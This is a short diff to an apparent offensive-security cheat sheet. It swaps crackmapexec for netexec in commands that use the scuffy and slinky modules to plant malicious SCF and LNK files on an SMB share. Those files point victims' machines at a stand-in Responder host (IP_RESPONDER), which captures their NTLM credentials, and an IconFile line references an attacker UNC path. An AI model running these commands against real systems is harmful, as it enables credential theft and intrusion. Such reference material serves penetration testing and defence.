@@ -98,12 +98,12 @@ IconFile=\\10.10.10.10\Share\test.ico
 Command=ToggleDesktop
 ```
 
-Using [`crackmapexec`](https://github.com/mpgn/CrackMapExec/blob/master/cme/modules/slinky.py):
+Using [`netexec`](https://github.com/Pennyw0rth/NetExec/blob/master/cme/modules/slinky.py):
 
 ```ps1
-crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
-crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk
-crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP
+netexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
+netexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk
+netexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP
 ```
 
 ### URL Files
